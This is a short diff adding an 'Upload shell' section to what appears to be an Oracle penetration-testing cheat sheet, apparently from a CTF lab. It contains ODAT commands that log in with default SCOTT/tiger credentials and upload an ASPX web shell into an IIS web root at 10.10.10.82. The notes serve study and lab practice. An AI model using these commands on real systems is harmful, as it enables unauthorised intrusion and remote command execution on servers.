@@ -156,6 +156,17 @@ scott/tiger
 
 **use the the wordlist below for just the default accounts**
 
+**Upload shell**
+
+```text
+find vulnarable prosucers:
+odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
+
+upload shell:
+./odat-libc2.12-x86_64 dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.aspx /usr/share/webshells/aspx/cmdasp.aspx
+
+```
+
 ### Metasploit
 
 #### sid bruteforce:
